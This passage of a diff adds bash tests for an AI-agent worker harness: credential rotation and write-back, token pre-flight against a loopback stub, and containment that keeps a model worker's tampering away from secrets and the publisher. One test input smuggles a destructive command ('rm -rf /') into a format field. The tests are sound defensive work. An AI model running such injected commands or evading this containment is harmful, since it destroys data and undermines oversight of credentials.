+  local wbroot6="$tmp/wbroot-noenv-norot" wb_out6="$tmp/wb6-github-output" wb6_rc
+  mkdir -p "$wbroot6" "$tmp/wbcap6"
+  : > "$wb_out6"
+  if (
+    export WORKER_ROOT="$wbroot6" \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+           GITHUB_OUTPUT="$wb_out6" WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$tmp/wbcap6"
+    unset WORKER_CREDENTIAL_PATH WORKER_CREDENTIAL_BASELINE WORKER_CREDENTIAL_FORMAT
+    write_back
+  ) > "$tmp/wb6.log" 2>&1; then wb6_rc=0; else wb6_rc=$?; fi
+  chk "write_back (prepare aborted, NO rotation) is a clean rotated=false no-op" \
+    "$wb6_rc:$(grep -c '^rotated=false$' "$wb_out6" || true)" "0:1"
+  chk "write_back (prepare aborted, NO rotation) never invokes gh" \
+    "$([[ -e "$tmp/wbcap6/argv" ]] && printf called || printf uncalled)" "uncalled"
+  # The containment assertion is SKIPPED only when NEITHER mount path is declared. A HALF-declared
+  # pair is a shape nothing legitimate produces, so it must still die rather than silently skip the
+  # tamper check — otherwise "unset one variable" becomes a way past issue #134's containment.
+  local wbroot7="$tmp/wbroot-half" wb_out7="$tmp/wb7-github-output" wb7_rc
+  mkdir -p "$wbroot7" "$tmp/wbcap7"
+  printf 'POISONED-BY-THE-MODEL' > "$wbroot7/current"
+  printf '{"tokens":{"refresh_token":"ROTATED-SENTINEL-HALF"}}' > "$wbroot7/.credential-durable"
+  printf 'codex-auth-json\n' > "$wbroot7/.credential-format"
+  printf 'rotated\n' > "$wbroot7/.credential-rotated"
+  : > "$wb_out7"
+  if (
+    export WORKER_ROOT="$wbroot7" WORKER_CREDENTIAL_PATH="$wbroot7/current" \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+           GITHUB_OUTPUT="$wb_out7" WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$tmp/wbcap7"
+    unset WORKER_CREDENTIAL_BASELINE WORKER_CREDENTIAL_FORMAT
+    write_back
+  ) > "$tmp/wb7.log" 2>&1; then wb7_rc=0; else wb7_rc=$?; fi
+  chk "write_back FAILS closed on a HALF-declared mount pair (the tamper check is not optional)" \
+    "$([[ "$wb7_rc" -ne 0 ]] && printf fail || printf ok)" "fail"
+  chk "write_back half-declared path never invokes gh" \
+    "$([[ -e "$tmp/wbcap7/argv" ]] && printf called || printf uncalled)" "uncalled"
+  # An unrecognised host-side format record must fail closed, not smuggle unvalidated material into
+  # the central secret (the format drives WHICH validation the durable document gets).
+  local wbroot8="$tmp/wbroot-badfmt" wb_out8="$tmp/wb8-github-output" wb8_rc
+  mkdir -p "$wbroot8" "$tmp/wbcap8"
+  printf 'not-a-real-format\n' > "$wbroot8/.credential-format"
+  printf 'ROTATED-SENTINEL-BADFMT' > "$wbroot8/.credential-durable"
+  printf 'rotated\n' > "$wbroot8/.credential-rotated"
+  : > "$wb_out8"
+  if (
+    export WORKER_ROOT="$wbroot8" \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+           GITHUB_OUTPUT="$wb_out8" WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$tmp/wbcap8"
+    unset WORKER_CREDENTIAL_PATH WORKER_CREDENTIAL_BASELINE WORKER_CREDENTIAL_FORMAT
+    write_back
+  ) > "$tmp/wb8.log" 2>&1; then wb8_rc=0; else wb8_rc=$?; fi
+  chk "write_back FAILS closed on an unrecognised host-side credential format" \
+    "$([[ "$wb8_rc" -ne 0 ]] && printf fail || printf ok)" "fail"
+  chk "write_back unrecognised-format path never invokes gh" \
+    "$([[ -e "$tmp/wbcap8/argv" ]] && printf called || printf uncalled)" "uncalled"
+  # POST-MERGE RETRO-REVIEW OF #629 (F6): the format record used to be read through
+  # `tr -cd 'a-z-'`, which DELETES the offending characters instead of rejecting the value — so
+  # `codex-auth-json!` and `codex-auth-json2` both MANUFACTURED the accepted `codex-auth-json` and
+  # smuggled unvalidated material past the format gate. Each of these must fail closed, and each is
+  # a value the OLD sanitising read accepted.
+  local badfmt_n=0 badfmt
+  for badfmt in 'codex-auth-json!' 'codex-auth-json2' 'codex-auth-json;rm -rf /' \
+                'CODEX-AUTH-JSON' 'xcodex-auth-jsonx'; do
+    badfmt_n=$((badfmt_n + 1))
+    local wbrootS="$tmp/wbroot-sanitise-$badfmt_n" wb_outS="$tmp/wbS-$badfmt_n-github-output" wbS_rc
+    mkdir -p "$wbrootS" "$tmp/wbcapS$badfmt_n"
+    printf '%s\n' "$badfmt" > "$wbrootS/.credential-format"
+    printf 'ROTATED-SENTINEL-SANITISE' > "$wbrootS/.credential-durable"
+    printf 'rotated\n' > "$wbrootS/.credential-rotated"
+    : > "$wb_outS"
+    if (
+      export WORKER_ROOT="$wbrootS" \
+             WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+             REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+             GITHUB_OUTPUT="$wb_outS" WORKER_GH_BIN="$tmp/wb-gh" \
+             WB_CAPTURE="$tmp/wbcapS$badfmt_n"
+      unset WORKER_CREDENTIAL_PATH WORKER_CREDENTIAL_BASELINE WORKER_CREDENTIAL_FORMAT
+      write_back
+    ) > "$tmp/wbS$badfmt_n.log" 2>&1; then wbS_rc=0; else wbS_rc=$?; fi
+    chk "write_back FAILS closed on the format record '$badfmt' (the old sanitising read would have MANUFACTURED a valid format from it)" \
+      "$([[ "$wbS_rc" -ne 0 ]] && printf fail || printf ok)" "fail"
+    chk "write_back never invokes gh for the format record '$badfmt'" \
+      "$([[ -e "$tmp/wbcapS$badfmt_n/argv" ]] && printf called || printf uncalled)" "uncalled"
+  done
+  # ...and the accept direction, with the trailing whitespace a line-oriented file really carries.
+  local wbrootT="$tmp/wbroot-fmt-ws" wb_outT="$tmp/wbT-github-output" wbT_rc
+  mkdir -p "$wbrootT" "$tmp/wbcapT"
+  printf 'codex-auth-json  \r\n' > "$wbrootT/.credential-format"
+  printf '{"tokens":{"access_token":"A"}}' > "$wbrootT/.credential-durable"
+  printf 'rotated\n' > "$wbrootT/.credential-rotated"
+  : > "$wb_outT"
+  if (
+    export WORKER_ROOT="$wbrootT" \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+           GITHUB_OUTPUT="$wb_outT" WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$tmp/wbcapT"
+    unset WORKER_CREDENTIAL_PATH WORKER_CREDENTIAL_BASELINE WORKER_CREDENTIAL_FORMAT
+    write_back
+  ) > "$tmp/wbT.log" 2>&1; then wbT_rc=0; else wbT_rc=$?; fi
+  chk "write_back still ACCEPTS a format record with trailing whitespace/CR (the strict read is not simply 'refuse everything')" \
+    "$([[ "$wbT_rc" -eq 0 ]] && printf ok || printf fail)" "ok"
+
+  # --- HOST-SIDE PRE-FLIGHT, end to end through the REAL worker-prep.sh (issue #596). Hermetic:
+  # a stubbed CLI binary skips the npm install, and every fixture reaches its outcome with ZERO
+  # network egress (a comfortably-valid access token exchanges nothing; an empty stored refresh token
+  # is a remint condition that contacts nothing; the transient case points the LOOPBACK-ONLY endpoint
+  # seam at a closed local port). ---
+  _preflight_fixture() {
+    local root=$1 exp_offset=$2 refresh_value=$3
+    rm -rf -- "$root"
+    mkdir -p "$root/cli/node_modules/.bin"
+    printf '#!/bin/sh\nexit 0\n' > "$root/cli/node_modules/.bin/codex"
+    chmod +x "$root/cli/node_modules/.bin/codex"
+    python3 - "$exp_offset" "$refresh_value" <<'PY'
+import base64
+import json
+import sys
+import time
+
+offset, refresh_value = int(sys.argv[1]), sys.argv[2]
+enc = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+access = (f"{enc(b'{\"alg\":\"RS256\"}')}."
+          "%s.sig" % enc(json.dumps({'exp': int(time.time()) + offset}).encode()))
+print(json.dumps({"OPENAI_API_KEY": None, "auth_mode": "chatgpt",
+                  "tokens": {"id_token": "ID_TOKEN_FIXTURE", "access_token": access,
+                             "refresh_token": refresh_value,
+                             "account_id": "00000000-0000-4000-8000-000000000000"},
+                  "last_refresh": "2026-07-25T00:00:00.000000000Z"}))
+PY
+  }
+
+  # (a) VALID stored access token: no exchange, and the MOUNTED file carries NO refresh material.
+  local pfroot="$tmp/pf-valid" pf_cred pf_rc pf_env="$tmp/pf-valid.env"
+  pf_cred=$(_preflight_fixture "$pfroot" 864000 'REFRESH-TOKEN-SENTINEL-VALID')
+  : > "$pf_env"
+  if (
+    export WORKER_ROOT="$pfroot" WORKER_ACCOUNT=acctexample WORKER_PROVIDER=openai \
+           WORKER_HARNESS=codex WORKER_CREDENTIAL_FORMAT=codex-auth-json \
+           WORKER_ACCOUNT_CREDENTIAL="$pf_cred" GITHUB_ENV="$pf_env"
+    unset GITHUB_PATH
+    bash "$SCRIPT_DIR/worker-prep.sh"
+  ) > "$tmp/pf-valid.log" 2>&1; then pf_rc=0; else pf_rc=$?; fi
+  chk "(a) pre-flight on a valid stored access token succeeds" "$pf_rc" "0"
+  chk "(a) the MOUNTED credential's parsed key set is exactly what the CLI requires" \
+    "$(python3 -c '
+import json, sys
+d = json.load(open(sys.argv[1]))
+print(",".join(sorted(d)), "|", ",".join(sorted(d["tokens"])))' "$pfroot/home/.codex/auth.json" 2>&1)" \
+    "OPENAI_API_KEY,auth_mode,last_refresh,tokens | access_token,account_id,id_token,refresh_token"
+  chk "(a) the MOUNTED credential's refresh_token key is EMPTY (parsed, not grepped)" \
+    "$(python3 -c '
+import json, sys
+print(repr(json.load(open(sys.argv[1]))["tokens"]["refresh_token"]))' "$pfroot/home/.codex/auth.json" 2>&1)" \
+    "''"
+  chk "(a) the refresh-token VALUE appears NOWHERE under the mounted worker HOME" \
+    "$(grep -rlc 'REFRESH-TOKEN-SENTINEL-VALID' "$pfroot/home" 2>/dev/null | wc -l | tr -d ' ')" "0"
+  chk "(a) a valid access token performs NO exchange and leaves NO rotation marker" \
+    "$([[ -e "$pfroot/.credential-rotated" || -e "$pfroot/.credential-durable" ]] \
+      && printf rotated || printf clean)" "clean"
+  chk "(a) the pre-flight reports refreshed=false rotated=false" \
+    "$(grep -c 'pre-flight complete (refreshed=false, rotated=false)' "$tmp/pf-valid.log" || true)" "1"
+  chk "(b) the mounted credential is still mode 600 under the worker HOME" \
+    "$(stat -c '%a %n' "$pfroot/home/.codex/auth.json" 2>/dev/null | sed "s#$pfroot#ROOT#")" \
+    "600 ROOT/home/.codex/auth.json"
+  # (b) the read-only mount contract for that exact path is unchanged.
+  local pf_mount=()
+  mapfile -t pf_mount < <(_credential_mount_args "$pfroot" "$pfroot/home/.codex/auth.json")
+  chk "(b) the materialized path still builds the READ-ONLY in-HOME mount" \
+    "${pf_mount[*]}" \
+    "--mount type=bind,src=$pfroot/home/.codex/auth.json,dst=/home/worker/.codex/auth.json,readonly"
+
+  # (e) a DEAD stored grant (nothing to exchange) => the maintainer-action class, NOT `auth`.
+  local pfroot2="$tmp/pf-remint" pf2_rc pf2_env="$tmp/pf-remint.env"
+  pf_cred=$(_preflight_fixture "$pfroot2" -3600 '')
+  : > "$pf2_env"
+  if (
+    export WORKER_ROOT="$pfroot2" WORKER_ACCOUNT=acctexample WORKER_PROVIDER=openai \
+           WORKER_HARNESS=codex WORKER_CREDENTIAL_FORMAT=codex-auth-json \
+           WORKER_ACCOUNT_CREDENTIAL="$pf_cred" GITHUB_ENV="$pf2_env"
+    unset GITHUB_PATH
+    bash "$SCRIPT_DIR/worker-prep.sh"
+  ) > "$tmp/pf-remint.log" 2>&1; then pf2_rc=0; else pf2_rc=$?; fi
+  chk "(e) a dead stored grant FAILS the pre-flight (fail closed)" \
+    "$([[ "$pf2_rc" -ne 0 ]] && printf fail || printf ok)" "fail"
+  chk "(e) it emits the credential-remint-required class, loudly" \
+    "$(grep -c '^::error::worker-prep: model-exit-class=credential-remint-required' "$tmp/pf-remint.log" || true)" "1"
+  chk "(e) it is NOT classified as auth" \
+    "$(grep -c 'model-exit-class=auth' "$tmp/pf-remint.log" || true)" "0"
+  chk "(e) the class reaches GITHUB_ENV for the health/alert machinery" \
+    "$(grep -c '^WORKER_EXIT_CLASS=credential-remint-required$' "$pf2_env" || true)" "1"
+  chk "(e) the loud class names NO account handle (locked decision 22b)" \
+    "$(grep -ci 'acctexample' "$tmp/pf-remint.log" || true)" "0"
+  # POST-MERGE RETRO-REVIEW OF #629 (F6): `credential-remint-required` carries TWO causes — a
+  # provider-confirmed dead grant, and an INDETERMINATE outcome where the request WAS delivered and no
+  # usable response came back (a lost response, or a 2xx with an unusable body), so the grant's fate is
+  # UNKNOWN and it was deliberately not re-sent. The old line asserted "the stored refresh token ... is
+  # dead ... retrying cannot fix it", which OVERRODE broker-refresh's own correct message on the second
+  # cause. These three assertions pin the corrected wording.
+  chk "(e) the remint line says the one-time-use grant must NOT be re-sent" \
+    "$(grep -c 'must NOT re-send' "$tmp/pf-remint.log" || true)" "1"
+  chk "(e) the remint line covers the INDETERMINATE cause instead of asserting the grant IS dead" \
+    "$(grep -c 'its fate is unknown' "$tmp/pf-remint.log" || true)" "1"
+  chk "(e) the remint line no longer makes the unconditional 'retrying cannot fix it' claim" \
+    "$(grep -c 'An INTERACTIVE re-mint is required; retrying cannot fix it' "$tmp/pf-remint.log" \
+      || true)" "0"
+
+  # (f) a TRANSIENT endpoint failure: bounded retry, then the transient class (never remint).
+  local pfroot3="$tmp/pf-transient" pf3_rc pf3_env="$tmp/pf-transient.env"
+  pf_cred=$(_preflight_fixture "$pfroot3" -3600 'REFRESH-TOKEN-SENTINEL-TRANSIENT')
+  : > "$pf3_env"
+  if (
+    export WORKER_ROOT="$pfroot3" WORKER_ACCOUNT=acctexample WORKER_PROVIDER=openai \
+           WORKER_HARNESS=codex WORKER_CREDENTIAL_FORMAT=codex-auth-json \
+           WORKER_ACCOUNT_CREDENTIAL="$pf_cred" GITHUB_ENV="$pf3_env" \
+           REGISTRY_TOKEN_ENDPOINT_OVERRIDE='http://127.0.0.1:1/oauth/token'
+    unset GITHUB_PATH
+    bash "$SCRIPT_DIR/worker-prep.sh"
+  ) > "$tmp/pf-transient.log" 2>&1; then pf3_rc=0; else pf3_rc=$?; fi
+  chk "(f) an unreachable token endpoint FAILS the pre-flight after the bounded retry" \
+    "$([[ "$pf3_rc" -ne 0 ]] && printf fail || printf ok)" "fail"
+  chk "(f) it emits the credential-refresh-transient class" \
+    "$(grep -c '^::error::worker-prep: model-exit-class=credential-refresh-transient' "$tmp/pf-transient.log" || true)" "1"
+  chk "(f) a transient failure is NOT reported as remint-required" \
+    "$(grep -c 'credential-remint-required' "$tmp/pf-transient.log" || true)" "0"
+  chk "(f) the transient class reaches GITHUB_ENV" \
+    "$(grep -c '^WORKER_EXIT_CLASS=credential-refresh-transient$' "$pf3_env" || true)" "1"
+  # F6, the AVAILABILITY property this case proves: a closed local port is refused during CONNECT, so
+  # nothing was transmitted, the grant is untouched, and the bounded retry is preserved rather than
+  # paging a maintainer re-mint on attempt 1. #629's type-based phase test could not tell this apart
+  # from a lost response. The corrected line must also stop asserting the endpoint was merely
+  # "unreachable" when a throttle or a server error lands here too.
+  chk "(f) the transient line explains that a LATER attempt is safe (a spent grant then fails closed)" \
+    "$(grep -c 'fail closed as a dead grant' "$tmp/pf-transient.log" || true)" "1"
+
+  # --- (h) a SUCCESSFUL host-side ROTATION, end to end through the REAL worker-prep.sh, then the
+  # REAL write_back over the artifacts it left behind (retro-review of #614). Until this case the
+  # pre-flight was only exercised on its FAILURE paths, so nothing proved that the artifacts the
+  # rescued write-back depends on — the durable material, the FORMAT record, the rotation marker —
+  # are actually produced, nor that they are produced BEFORE the rest of prepare can fail. Hermetic:
+  # a one-shot loopback token endpoint on an ephemeral port through the LOOPBACK-ONLY override seam;
+  # no network egress, no fixture reaches the real provider. ---
+  cat > "$tmp/pf-token-server.py" <<'PY'
+import base64
+import http.server
+import json
+import sys
+import time
+
+port_file, request_file = sys.argv[1], sys.argv[2]
+
+
+def enc(raw):
+    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
+
+
+class Handler(http.server.BaseHTTPRequestHandler):
+    def do_POST(self):
+        body = self.rfile.read(int(self.headers.get("Content-Length", 0) or 0))
+        with open(request_file, "wb") as handle:
+            handle.write(body)
+        access = (enc(json.dumps({"alg": "RS256"}).encode()) + "."
+                  + enc(json.dumps({"exp": int(time.time()) + 864000}).encode()) + ".sig")
+        payload = json.dumps({"access_token": access,
+                              "refresh_token": "REFRESH-TOKEN-SENTINEL-ROTATED",
+                              "id_token": "ID_TOKEN_ROTATED"}).encode()
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json")
+        self.send_header("Content-Length", str(len(payload)))
+        self.end_headers()
+        self.wfile.write(payload)
+
+    def log_message(self, *_args):
+        return
+
+
+server = http.server.HTTPServer(("127.0.0.1", 0), Handler)
+with open(port_file, "w", encoding="utf-8") as handle:
+    handle.write(str(server.server_port))
+server.handle_request()
+PY
+  local pfroot5="$tmp/pf-rotate" pf5_rc pf5_env="$tmp/pf-rotate.env"
+  local pf5_port_file="$tmp/pf-rotate.port" pf5_request="$tmp/pf-rotate.request" pf5_port=""
+  rm -f -- "$pf5_port_file" "$pf5_request"
+  python3 "$tmp/pf-token-server.py" "$pf5_port_file" "$pf5_request" \
+    > "$tmp/pf-rotate-server.log" 2>&1 &
+  local pf5_server_pid=$!
+  local pf5_wait=0
+  while [[ ! -s "$pf5_port_file" && "$pf5_wait" -lt 100 ]]; do
+    sleep 0.05
+    pf5_wait=$((pf5_wait + 1))
+  done
+  pf5_port=$(cat "$pf5_port_file" 2>/dev/null || true)
+  chk "(h) the hermetic loopback token endpoint came up on an ephemeral port" \
+    "$([[ "$pf5_port" =~ ^[0-9]+$ ]] && printf up || printf down)" "up"
+  pf_cred=$(_preflight_fixture "$pfroot5" -3600 'REFRESH-TOKEN-SENTINEL-ORIGINAL')
+  : > "$pf5_env"
+  if (
+    export WORKER_ROOT="$pfroot5" WORKER_ACCOUNT=acctexample WORKER_PROVIDER=openai \
+           WORKER_HARNESS=codex WORKER_CREDENTIAL_FORMAT=codex-auth-json \
+           WORKER_ACCOUNT_CREDENTIAL="$pf_cred" GITHUB_ENV="$pf5_env" \
+           REGISTRY_TOKEN_ENDPOINT_OVERRIDE="http://127.0.0.1:$pf5_port/oauth/token"
+    unset GITHUB_PATH
+    bash "$SCRIPT_DIR/worker-prep.sh"
+  ) > "$tmp/pf-rotate.log" 2>&1; then pf5_rc=0; else pf5_rc=$?; fi
+  wait "$pf5_server_pid" 2>/dev/null || true
+  chk "(h) the pre-flight completes against a rotating token endpoint" "$pf5_rc" "0"
+  chk "(h) the pre-flight reports refreshed=true rotated=true" \
+    "$(grep -c 'pre-flight complete (refreshed=true, rotated=true)' "$tmp/pf-rotate.log" || true)" "1"
+  chk "(h) the ORIGINAL one-time-use grant was transmitted EXACTLY ONCE, verbatim" \
+    "$(python3 -c '
+import json, sys
+print(json.load(open(sys.argv[1]))["refresh_token"])' "$pf5_request" 2>&1)" \
+    "REFRESH-TOKEN-SENTINEL-ORIGINAL"
+  chk "(h) the ROTATION MARKER is written host-side" \
+    "$([[ -f "$pfroot5/.credential-rotated" ]] && printf marked || printf missing)" "marked"
+  # THE #614 ARTIFACT: the format lands WITH the marker, not with the $GITHUB_ENV export at the very
+  # end of prepare — so a prepare abort in between still leaves write_back able to validate the
+  # rotated material it must persist.
+  chk "(h) the CREDENTIAL FORMAT is recorded host-side alongside the marker" \
+    "$(cat "$pfroot5/.credential-format" 2>/dev/null)" "codex-auth-json"
+  chk "(h) the format record is mode 600" \
+    "$(stat -c '%a' "$pfroot5/.credential-format" 2>/dev/null)" "600"
+  chk "(h) the DURABLE material carries the ROTATED refresh token" \
+    "$(python3 -c '
+import json, sys
+print(json.load(open(sys.argv[1]))["tokens"]["refresh_token"])' \
+      "$pfroot5/.credential-durable" 2>&1)" "REFRESH-TOKEN-SENTINEL-ROTATED"
+  chk "(h) NEITHER refresh token appears anywhere under the mounted worker HOME" \
+    "$(grep -rlc 'REFRESH-TOKEN-SENTINEL-ROTATED\|REFRESH-TOKEN-SENTINEL-ORIGINAL' \
+      "$pfroot5/home" 2>/dev/null | wc -l | tr -d ' ')" "0"
+  chk "(h) no token material reaches the PUBLIC prep log" \
+    "$(grep -c 'REFRESH-TOKEN-SENTINEL' "$tmp/pf-rotate.log" || true)" "0"
+  # ...and the REAL write_back over those artifacts, with the mount env DELIBERATELY UNSET, i.e. the
+  # exact state an abort between the rotation and the $GITHUB_ENV export leaves behind.
+  local wb_g_out="$tmp/wb-g-github-output" wbg_rc
+  mkdir -p "$tmp/wbcapg"
+  : > "$wb_g_out"
+  if (
+    export WORKER_ROOT="$pfroot5" \
+           WORKER_ACCOUNT=acctexample WORKER_SECRET_REF=ACCTEXAMPLE_TOKEN \
+           REGISTRY_REPO=o/r REGISTRY_SECRETS_PAT=fake-pat-value \
+           GITHUB_OUTPUT="$wb_g_out" WORKER_GH_BIN="$tmp/wb-gh" WB_CAPTURE="$tmp/wbcapg"
+    unset WORKER_CREDENTIAL_PATH WORKER_CREDENTIAL_BASELINE WORKER_CREDENTIAL_FORMAT
+    write_back
+  ) > "$tmp/wb-g.log" 2>&1; then wbg_rc=0; else wbg_rc=$?; fi
+  chk "(h) write_back persists the REAL rotated credential with the mount env absent" \
+    "$wbg_rc:$(grep -c '^rotated=true$' "$wb_g_out" || true)" "0:1"
+  chk "(h) what reaches the account secret is the ROTATED durable document" \
+    "$(python3 -c '
+import json, sys
+print(json.load(open(sys.argv[1]))["tokens"]["refresh_token"])' "$tmp/wbcapg/stdin" 2>&1)" \
+    "REFRESH-TOKEN-SENTINEL-ROTATED"
+  chk "(h) write_back never echoes either token" \
+    "$(grep -c 'REFRESH-TOKEN-SENTINEL' "$tmp/wb-g.log" || true)" "0"
+
+  # HONESTY of the classification: a prep failure that is NOT a refresh failure (here a malformed
+  # stored credential) must classify NOTHING — downstream then records the truthful `unknown`
+  # rather than a refresh class nobody observed.
+  local pfroot4="$tmp/pf-malformed" pf4_rc pf4_env="$tmp/pf-malformed.env"
+  _preflight_fixture "$pfroot4" 864000 'unused' >/dev/null
+  : > "$pf4_env"
+  if (
+    export WORKER_ROOT="$pfroot4" WORKER_ACCOUNT=acctexample WORKER_PROVIDER=openai \
+           WORKER_HARNESS=codex WORKER_CREDENTIAL_FORMAT=codex-auth-json \
+           WORKER_ACCOUNT_CREDENTIAL='not json at all' GITHUB_ENV="$pf4_env"
+    unset GITHUB_PATH
+    bash "$SCRIPT_DIR/worker-prep.sh"
+  ) > "$tmp/pf-malformed.log" 2>&1; then pf4_rc=0; else pf4_rc=$?; fi
+  chk "a NON-refresh prep failure still fails closed" \
+    "$([[ "$pf4_rc" -ne 0 ]] && printf fail || printf ok)" "fail"
+  chk "a NON-refresh prep failure classifies NOTHING (no invented refresh class)" \
+    "$(grep -c 'model-exit-class' "$tmp/pf-malformed.log" || true):$(grep -c 'WORKER_EXIT_CLASS' "$pf4_env" || true)" \
+    "0:0"
+
+  # (g) NO token material in ANY captured output of ANY pre-flight/write-back path above. Every
+  # fixture uses a distinctive sentinel, so this grep is non-vacuous: materializing the full
+  # auth.json, echoing the durable file, or logging the provider body all turn it red.
+  chk "(g) no refresh-token material in any captured pre-flight output" \
+    "$(grep -rlc 'REFRESH-TOKEN-SENTINEL' \
+        "$tmp/pf-valid.log" "$tmp/pf-remint.log" "$tmp/pf-transient.log" \
+        "$pf_env" "$pf2_env" "$pf3_env" 2>/dev/null | wc -l | tr -d ' ')" "0"
+  chk "(g) no credential material in any captured write-back output" \
+    "$(grep -rlc 'ROTATED-SENTINEL\|POISONED-BY-THE-MODEL' \
+        "$tmp/wb.log" "$tmp/wb-fail.log" "$tmp/wb2.log" "$tmp/wb3.log" "$tmp/wb4.log" \
+        "$wb_out" "$wb_out2" "$wb_out3" "$wb_out4" "$wb_fail_out" 2>/dev/null | wc -l | tr -d ' ')" "0"
+  # The PAT is a DELIBERATE exception and only in one shape: `::add-mask::<pat>` is the workflow
+  # command that makes the runner redact it everywhere after. Assert it appears ONLY there — a
+  # regression that printed it in a diagnostic would show up as a non-add-mask occurrence.
+  chk "(g) the registry PAT appears only inside ::add-mask:: workflow commands" \
+    "$(cat "$tmp/wb.log" "$tmp/wb-fail.log" "$tmp/wb2.log" "$tmp/wb3.log" "$tmp/wb4.log" \
+        "$wb_out" "$wb_out2" "$wb_out3" "$wb_out4" "$wb_fail_out" 2>/dev/null \
+        | grep -c 'fake-pat-value' || true):$(cat "$tmp/wb.log" "$tmp/wb-fail.log" "$tmp/wb2.log" \
+        "$tmp/wb3.log" "$tmp/wb4.log" "$wb_out" "$wb_out2" "$wb_out3" "$wb_out4" "$wb_fail_out" \
+        2>/dev/null | grep -c '^::add-mask::fake-pat-value$' || true)" "2:2"
+  chk "(g) the sentinel grep is NON-VACUOUS (it finds the durable file it is meant to guard)" \
+    "$(grep -lc 'ROTATED-SENTINEL' "$wbroot/.credential-durable" 2>/dev/null | wc -l | tr -d ' ')" "1"
+
+  # ================================================================================================
+  # ISSUE #575 — the publish bundle: hostile gate code must not be able to reach the token-bearing
+  # publisher. Real git fixtures end to end: seal PRE-GATE on the "worker", verify on the
+  # "publisher", reconstruct with `git apply` and hooks neutralised. Every refusal arm is exercised
+  # against a bundle that would otherwise verify, so none of these can pass vacuously.
+  # ================================================================================================
+  local wsrc="$tmp/bundle-src" wroot="$tmp/bundle-root" bout="$tmp/bundle.out"
+  local wbranch="sparq-agent/issue-575-99-1" wrepo="jeswr/agent-account-registry"
+  git init -q -b main "$wsrc"
+  _bgit() { git -C "$wsrc" -c user.name=t -c user.email=t@example.invalid "$@"; }
+  printf 'base line\n' > "$wsrc/tracked.txt"
+  mkdir -p "$wsrc/.beads"
+  printf 'beads\n' > "$wsrc/.beads/state.json"
+  _bgit add -A
+  _bgit commit -qm base
+  local wbase
+  wbase=$(git -C "$wsrc" rev-parse HEAD)
+  # the "model" edits a tracked file, adds an untracked one, and declares a follow-up
+  printf 'base line\nmodel line\n' > "$wsrc/tracked.txt"
+  printf 'brand new\n' > "$wsrc/added.txt"
+  mkdir -p "$wroot"
+  printf '{"title": "fix(core): stop the thing", "labels": [{"name": "role:impl"}, {"name": "area:core"}]}\n' \
+    > "$tmp/bundle-issue.json"
+  printf '{"title": "t", "body": "b", "labels": ["kind:bug"]}\n' > "$wroot/followups.jsonl"
+
+  _bundle_env() {
+    export TARGET_DIR="$wsrc" TARGET_REPO="$wrepo" WORKER_ROOT="$wroot" \
+           WORKER_ISSUE_FILE="$tmp/bundle-issue.json" ISSUE_NUMBER=575 \
+           WORKER_BRANCH="$wbranch" TARGET_DEFAULT_BRANCH=main WORKER_MODEL_ALIAS=opus5 \
+           WORKER_PROVIDER_MODEL=claude-opus-5 WORKER_AGENT=registry-impl \
+           GATE_PROFILE=crate-scoped ARM_AUTO_MERGE_REQUESTED=false WORKER_PROVIDER=anthropic \
+           GITHUB_OUTPUT="$bout"
+    unset GH_TOKEN
+  }
+  : > "$bout"
+  local bundle_rc
+  if ( _bundle_env; bundle_work ) > "$tmp/bundle.log" 2>&1; then bundle_rc=0; else bundle_rc=$?; fi
+  chk "#575 bundle: the pre-gate seal succeeds on a normal model diff" "$bundle_rc" "0"
+  local bdir="$wroot/publish-bundle" bdigest
+  bdigest=$(grep -oE '^bundle_digest=[0-9a-f]{64}$' "$bout" | tail -n1 | cut -d= -f2 || true)
+  chk "#575 bundle: a 64-hex digest is recorded as a PRE-GATE step output" \
+    "$([[ "$bdigest" =~ ^[0-9a-f]{64}$ ]] && printf hex || printf missing)" "hex"
+  chk "#575 bundle: the pre-gate BASE SHA is recorded as a step output" \
+    "$(grep -c "^bundle_base_sha=$wbase\$" "$bout" || true)" "1"
+  chk "#575 bundle: the recorded digest IS the digest of the sealed directory (non-vacuous)" \
+    "$([[ "$bdigest" == "$(_bundle_digest "$bdir")" ]] && printf same || printf differs)" "same"
+  chk "#575 bundle: it carries ONLY inert data (patch + PR text + meta + followups)" \
+    "$(cd "$bdir" && find . -type f | sed 's|^\./||' | sort | paste -sd, -)" \
+    "followups.jsonl,meta.json,patch.diff,pr-body.md,pr-title.txt"
+  chk "#575 bundle: nothing in it is executable" \
+    "$(find "$bdir" -type f -perm -u+x | wc -l | tr -d ' ')" "0"
+  # THE GATE-VACUITY GUARD. Sealing must leave the worktree exactly as the model left it: the gate
+  # runs NEXT and derives its crate scope / registry-selftest targets from `git status`. A bundle
+  # phase that committed (or left the index staged) would empty that listing and the gate would
+  # pass having validated nothing.
+  chk "#575 bundle: the pre-gate INDEX is restored (nothing left staged for the gate)" \
+    "$(git -C "$wsrc" diff --cached --name-only | wc -l | tr -d ' ')" "0"
+  chk "#575 bundle: HEAD did not move (no commit was made on the hostile runner)" \
+    "$(git -C "$wsrc" rev-parse HEAD)" "$wbase"
+  chk "#575 bundle: the gate still sees the model's changed paths (gate stays non-vacuous)" \
+    "$(git -C "$wsrc" status --porcelain=v1 --untracked-files=all -z | _porcelain_changed_paths | sort | paste -sd, -)" \
+    "added.txt,tracked.txt"
+  chk "#575 bundle: it REFUSES to run with a token in scope (token-free by construction)" \
